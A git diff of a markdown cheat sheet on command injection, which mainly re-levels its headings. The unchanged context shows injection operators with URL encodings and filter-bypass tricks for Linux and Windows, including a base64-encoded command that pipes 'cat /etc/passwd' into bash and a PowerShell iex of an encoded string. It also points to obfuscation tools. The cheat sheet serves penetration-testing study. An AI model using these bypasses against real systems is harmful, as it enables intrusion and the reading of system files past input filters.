@@ -1,9 +1,5 @@
-# Web
-
-[[ TOC]]
-
-## Command Injection
-### Detection
+# Command Injection
+## Detection
 
 | Character | URL-encoded Character | Executed Command |
 | :-----------: | -------------------- | ----------------- |
@@ -16,11 +12,11 @@
 |  ``  | %60%60    | Both (Linux-only)                          |
 |  $() | %24%28%29 | Both (Linux-only)                          |
 
-### Bypassing filters
+## Bypassing filters
 
-#### Linux
+### Linux
 
-##### Bypassing blacklisted characters
+#### Bypassing blacklisted characters
 
 Using Tabs
 
@@ -64,7 +60,7 @@ man ascii     # \ is on 92, before it is [ on 91
 echo $(tr '!-}' '"-~'<<<[)
 \
 ```
-##### Bypassing Commands Blacklist
+#### Bypassing Commands Blacklist
 Adding '
 
 ```bash
@@ -103,14 +99,14 @@ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 >You can use other alternatives like *sh* instead of *bash* or *openssl* for b64 decoding or *xxd* fpr hex decoding
 
-#### Tools
+### Tools
 
 [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 
 
-### Windows
+## Windows
 
-##### Bypassing blacklisted characters
+#### Bypassing blacklisted characters
 
 Using Characters from Environment Variables (CMD)
 
@@ -129,7 +125,7 @@ $env:HOMEPATH[0]
 ```PowerShell
 Get-ChildItem Env:
 ```
-##### Bypassing Commands Blacklist
+#### Bypassing Commands Blacklist
 
 Adding '
 
@@ -165,10 +161,10 @@ Encoded commands
 ```powershell
 iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
 ```
-#### Tools 
+### Tools 
 
 [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
 
-### Additional links 
+## Additional links 
 
 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
